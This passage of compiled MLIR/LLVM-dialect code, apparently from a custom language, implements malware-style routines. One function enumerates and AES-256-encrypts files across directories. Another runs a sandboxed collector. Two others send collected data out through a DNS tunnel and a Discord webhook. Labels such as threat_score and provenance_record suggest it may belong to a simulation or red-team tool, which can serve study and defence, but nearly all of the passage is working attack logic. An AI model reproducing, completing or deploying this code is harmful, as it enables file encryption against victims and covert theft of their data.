    llvm.call @println(%66) : (!llvm.ptr) -> ()
    %67 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%67) : (!llvm.ptr) -> ()
    %68 = llvm.load %39 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.return %68 : !llvm.ptr
  }
  llvm.func @collect_and_encrypt_data(%arg0: !llvm.ptr) -> i32 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.96" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.constant(32 : i32) : i32
    %4 = llvm.mlir.constant(0 : i64) : i64
    %5 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.105" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.104" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.106" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.107" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.108" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.109" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.110" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.97" : !llvm.ptr
    %14 = llvm.mlir.constant(false) : i1
    %15 = llvm.mlir.addressof @".str.102" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.103" : !llvm.ptr
    %17 = llvm.mlir.constant(1 : i64) : i64
    %18 = llvm.mlir.addressof @".str.22" : !llvm.ptr
    %19 = llvm.mlir.constant(50 : i32) : i32
    %20 = llvm.mlir.constant(1024 : i32) : i32
    %21 = llvm.mlir.constant(65536 : i32) : i32
    %22 = llvm.mlir.addressof @".str.98" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.99" : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.100" : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.101" : !llvm.ptr
    %26 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg0, %26 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %27 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %28 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %29 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %30 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %31 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %32 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %33 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %34 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.call @crypto_generate_key(%3) : (i32) -> !llvm.ptr
    llvm.store %35, %27 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %36 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %36 {alignment = 4 : i64} : i32, !llvm.ptr
    %37 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %38 = llvm.load %26 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.call @array_len(%38) : (!llvm.ptr) -> i64
    %40 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %4, %40 {alignment = 4 : i64} : i64, !llvm.ptr
    %41 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb13
    %42 = llvm.load %40 {alignment = 4 : i64} : !llvm.ptr -> i64
    %43 = llvm.icmp "slt" %42, %39 : i64
    llvm.cond_br %43, ^bb2, ^bb14
  ^bb2:  // pred: ^bb1
    %44 = llvm.bitcast %38 : !llvm.ptr to !llvm.ptr
    %45 = llvm.getelementptr %44[%42] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %46 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %46, %41 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %47 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %48 = llvm.load %41 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %49 = llvm.call @jocky_str_concat(%47, %48) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    %50 = llvm.load %41 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %51 = llvm.call @fs_list_files(%50, %14) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %51, %28 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %52 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %52 {alignment = 4 : i64} : i32, !llvm.ptr
    %53 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %53 {alignment = 4 : i64} : i32, !llvm.ptr
    %54 = llvm.load %28 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %55 = llvm.call @array_len(%54) : (!llvm.ptr) -> i64
    %56 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %4, %56 {alignment = 4 : i64} : i64, !llvm.ptr
    %57 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb2, ^bb9
    %58 = llvm.load %56 {alignment = 4 : i64} : !llvm.ptr -> i64
    %59 = llvm.icmp "slt" %58, %55 : i64
    llvm.cond_br %59, ^bb4, ^bb10
  ^bb4:  // pred: ^bb3
    %60 = llvm.bitcast %54 : !llvm.ptr to !llvm.ptr
    %61 = llvm.getelementptr %60[%58] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %62 = llvm.load %61 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %62, %57 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %63 = llvm.load %41 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %64 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %65 = llvm.call @jocky_str_concat(%63, %64) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %66 = llvm.load %57 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %67 = llvm.call @jocky_str_concat(%65, %66) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %67, %29 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %68 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %69 = llvm.call @fs_file_size(%68) : (!llvm.ptr) -> i64
    llvm.store %69, %30 {alignment = 4 : i64} : i64, !llvm.ptr
    %70 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %71 = llvm.sext %2 : i32 to i64
    %72 = llvm.icmp "sgt" %70, %71 : i64
    llvm.cond_br %72, ^bb5, ^bb6(%14 : i1)
  ^bb5:  // pred: ^bb4
    %73 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %74 = llvm.mul %19, %20 : i32
    %75 = llvm.mul %74, %20 : i32
    %76 = llvm.sext %75 : i32 to i64
    %77 = llvm.icmp "slt" %73, %76 : i64
    llvm.br ^bb6(%77 : i1)
  ^bb6(%78: i1):  // 2 preds: ^bb4, ^bb5
    llvm.cond_br %78, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %79 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %80 = llvm.call @fs_read_file(%79) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %80, %31 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %81 = llvm.load %31 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %82 = llvm.load %27 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %83 = llvm.ptrtoint %82 : !llvm.ptr to i32
    %84 = llvm.mlir.addressof @crypto_aes256_encrypt : !llvm.ptr
    %85 = llvm.call %84(%81, %83) : !llvm.ptr, (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %85, %32 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %86 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %87 = llvm.sext %21 : i32 to i64
    %88 = llvm.sdiv %86, %87 : i64
    %89 = llvm.sext %0 : i32 to i64
    %90 = llvm.add %88, %89 : i64
    llvm.store %90, %33 {alignment = 4 : i64} : i64, !llvm.ptr
    %91 = llvm.load %36 {alignment = 4 : i64} : !llvm.ptr -> i32
    %92 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %93 = llvm.sext %91 : i32 to i64
    %94 = llvm.add %93, %92 : i64
    %95 = llvm.trunc %94 : i64 to i32
    llvm.store %95, %36 {alignment = 4 : i64} : i32, !llvm.ptr
    %96 = llvm.load %37 {alignment = 4 : i64} : !llvm.ptr -> i32
    %97 = llvm.load %33 {alignment = 4 : i64} : !llvm.ptr -> i64
    %98 = llvm.sext %96 : i32 to i64
    %99 = llvm.add %98, %97 : i64
    %100 = llvm.trunc %99 : i64 to i32
    llvm.store %100, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %101 = llvm.load %52 {alignment = 4 : i64} : !llvm.ptr -> i32
    %102 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %103 = llvm.sext %101 : i32 to i64
    %104 = llvm.add %103, %102 : i64
    %105 = llvm.trunc %104 : i64 to i32
    llvm.store %105, %52 {alignment = 4 : i64} : i32, !llvm.ptr
    %106 = llvm.load %53 {alignment = 4 : i64} : !llvm.ptr -> i32
    %107 = llvm.add %106, %0 : i32
    llvm.store %107, %53 {alignment = 4 : i64} : i32, !llvm.ptr
    %108 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %109 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %110 = llvm.getelementptr %23[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %111 = llvm.load %33 {alignment = 4 : i64} : !llvm.ptr -> i64
    %112 = llvm.call @string(%111) : (i64) -> !llvm.ptr
    %113 = llvm.call @jocky_str_concat(%110, %112) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @provenance_record(%108, %109, %113) : (!llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %114 = llvm.getelementptr %24[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %115 = llvm.getelementptr %25[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %116 = llvm.load %57 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %117 = llvm.load %30 {alignment = 4 : i64} : !llvm.ptr -> i64
    %118 = llvm.call @string(%117) : (i64) -> !llvm.ptr
    llvm.call @log_operation(%114, %115, %116, %118) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    llvm.br ^bb9
  ^bb9:  // pred: ^bb8
    %119 = llvm.add %58, %17 : i64
    llvm.store %119, %56 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb3
  ^bb10:  // pred: ^bb3
    %120 = llvm.load %53 {alignment = 4 : i64} : !llvm.ptr -> i32
    %121 = llvm.icmp "sgt" %120, %2 : i32
    llvm.cond_br %121, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %122 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %123 = llvm.load %53 {alignment = 4 : i64} : !llvm.ptr -> i32
    %124 = llvm.sext %123 : i32 to i64
    %125 = llvm.call @string(%124) : (i64) -> !llvm.ptr
    %126 = llvm.call @jocky_str_concat(%122, %125) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %127 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %128 = llvm.call @jocky_str_concat(%126, %127) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %129 = llvm.load %52 {alignment = 4 : i64} : !llvm.ptr -> i32
    %130 = llvm.sext %129 : i32 to i64
    %131 = llvm.call @string(%130) : (i64) -> !llvm.ptr
    %132 = llvm.call @jocky_str_concat(%128, %131) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %133 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %134 = llvm.call @jocky_str_concat(%132, %133) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%134) : (!llvm.ptr) -> ()
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb10, ^bb11
    llvm.br ^bb13
  ^bb13:  // pred: ^bb12
    %135 = llvm.add %42, %17 : i64
    llvm.store %135, %40 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb14:  // pred: ^bb1
    %136 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%136) : (!llvm.ptr) -> ()
    %137 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    %138 = llvm.load %36 {alignment = 4 : i64} : !llvm.ptr -> i32
    %139 = llvm.sext %138 : i32 to i64
    %140 = llvm.call @string(%139) : (i64) -> !llvm.ptr
    %141 = llvm.call @jocky_str_concat(%137, %140) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %142 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %143 = llvm.call @jocky_str_concat(%141, %142) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%143) : (!llvm.ptr) -> ()
    %144 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    %145 = llvm.load %37 {alignment = 4 : i64} : !llvm.ptr -> i32
    %146 = llvm.sext %145 : i32 to i64
    %147 = llvm.call @string(%146) : (i64) -> !llvm.ptr
    %148 = llvm.call @jocky_str_concat(%144, %147) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %149 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %150 = llvm.call @jocky_str_concat(%148, %149) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%150) : (!llvm.ptr) -> ()
    %151 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %152 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %153 = llvm.load %36 {alignment = 4 : i64} : !llvm.ptr -> i32
    %154 = llvm.sext %153 : i32 to i64
    %155 = llvm.call @string(%154) : (i64) -> !llvm.ptr
    %156 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @log_operation(%151, %152, %155, %156) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %157 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%157) : (!llvm.ptr) -> ()
    %158 = llvm.load %37 {alignment = 4 : i64} : !llvm.ptr -> i32
    llvm.return %158 : i32
  }
  llvm.func @spawn_sandbox_collector() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.111" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.112" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.113" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.114" : !llvm.ptr
    %6 = llvm.mlir.constant(256 : i32) : i32
    %7 = llvm.mlir.constant(1024 : i32) : i32
    %8 = llvm.mlir.constant(100 : i32) : i32
    %9 = llvm.mlir.constant(120000 : i32) : i32
    %10 = llvm.mlir.addressof @".str.115" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.116" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.117" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.118" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.119" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %16 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %17 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %20 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
    %21 = llvm.mlir.addressof @sandbox_spawn : !llvm.ptr
    %22 = llvm.call %21(%19, %20) : !llvm.ptr, (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %22, %16 {alignment = 4 : i64} : i32, !llvm.ptr
    %23 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %24 = llvm.icmp "sgt" %23, %2 : i32
    llvm.cond_br %24, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %25 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %26 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %27 = llvm.sext %26 : i32 to i64
    %28 = llvm.call @string(%27) : (i64) -> !llvm.ptr
    %29 = llvm.call @jocky_str_concat(%25, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %31 = llvm.mul %6, %7 : i32
    %32 = llvm.mul %31, %7 : i32
    %33 = llvm.sext %32 : i32 to i64
    %34 = llvm.mul %8, %7 : i32
    %35 = llvm.mul %34, %7 : i32
    %36 = llvm.sext %35 : i32 to i64
    %37 = llvm.mlir.addressof @sandbox_set_limits : !llvm.ptr
    %38 = llvm.call %37(%30, %33, %9, %36) : !llvm.ptr, (i32, i64, i32, i64) -> i1
    %39 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %40 = llvm.mlir.addressof @sandbox_monitor : !llvm.ptr
    %41 = llvm.call %40(%39) : !llvm.ptr, (i32) -> i32
    llvm.store %41, %17 {alignment = 4 : i64} : i32, !llvm.ptr
    %42 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %43 = llvm.mlir.addressof @sandbox_wait : !llvm.ptr
    %44 = llvm.call %43(%42) : !llvm.ptr, (i32) -> i32
    %45 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %46 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    %47 = llvm.mlir.addressof @sandbox_export_trace : !llvm.ptr
    %48 = llvm.call %47(%45, %46) : !llvm.ptr, (i32, !llvm.ptr) -> i1
    %49 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    %50 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %51 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %52 = llvm.load %16 {alignment = 4 : i64} : !llvm.ptr -> i32
    %53 = llvm.sext %52 : i32 to i64
    %54 = llvm.call @string(%53) : (i64) -> !llvm.ptr
    %55 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    llvm.call @log_operation(%50, %51, %54, %55) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %56 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%56) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @exfiltrate_via_dns() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.120" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.121" : !llvm.ptr
    %4 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.122" : !llvm.ptr
    %6 = llvm.mlir.addressof @loaded_drivers : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.123" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.128" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.124" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.125" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.126" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.127" : !llvm.ptr
    %13 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %17 = llvm.load %4 {alignment = 4 : i64} : !llvm.ptr -> i32
    %18 = llvm.sext %17 : i32 to i64
    %19 = llvm.call @string(%18) : (i64) -> !llvm.ptr
    %20 = llvm.call @jocky_str_concat(%16, %19) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %21 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %22 = llvm.call @jocky_str_concat(%20, %21) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %23 = llvm.load %6 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %24 = llvm.call @array_len(%23) : (!llvm.ptr) -> i64
    %25 = llvm.call @string(%24) : (i64) -> !llvm.ptr
    %26 = llvm.call @jocky_str_concat(%22, %25) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %26, %13 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %27 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %28 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %29 = llvm.call @exfil_dns_tunnel(%27, %28) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %29, %14 {alignment = 4 : i64} : i32, !llvm.ptr
    %30 = llvm.load %14 {alignment = 4 : i64} : !llvm.ptr -> i32
    %31 = llvm.icmp "eq" %30, %2 : i32
    llvm.cond_br %31, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %32 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%32) : (!llvm.ptr) -> ()
    %33 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %34 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %35 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %36 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @log_operation(%33, %34, %35, %36) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb2:  // pred: ^bb0
    %37 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @println(%37) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    llvm.return
  }
  llvm.func @exfiltrate_via_discord() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.129" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.130" : !llvm.ptr
    %4 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.131" : !llvm.ptr
    %6 = llvm.mlir.addressof @loaded_drivers : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.132" : !llvm.ptr
    %8 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.133" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.134" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.125" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.135" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.136" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.137" : !llvm.ptr
    %15 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %17 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    %20 = llvm.load %4 {alignment = 4 : i64} : !llvm.ptr -> i32
    %21 = llvm.sext %20 : i32 to i64
    %22 = llvm.call @string(%21) : (i64) -> !llvm.ptr
    %23 = llvm.call @jocky_str_concat(%19, %22) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %24 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %25 = llvm.call @jocky_str_concat(%23, %24) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %26 = llvm.load %6 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %27 = llvm.call @array_len(%26) : (!llvm.ptr) -> i64
    %28 = llvm.call @string(%27) : (i64) -> !llvm.ptr
    %29 = llvm.call @jocky_str_concat(%25, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %30 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %31 = llvm.call @jocky_str_concat(%29, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %32 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> f64
    %33 = llvm.fptosi %32 : f64 to i64
    %34 = llvm.call @string(%33) : (i64) -> !llvm.ptr
    %35 = llvm.call @jocky_str_concat(%31, %34) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %35, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %36 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<122 x i8>
    llvm.store %36, %16 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %38 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.call @exfil_discord_webhook(%37, %38) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %39, %17 {alignment = 4 : i64} : i32, !llvm.ptr
    %40 = llvm.load %17 {alignment = 4 : i64} : !llvm.ptr -> i32
    %41 = llvm.icmp "eq" %40, %2 : i32
    llvm.cond_br %41, ^bb1, ^bb2
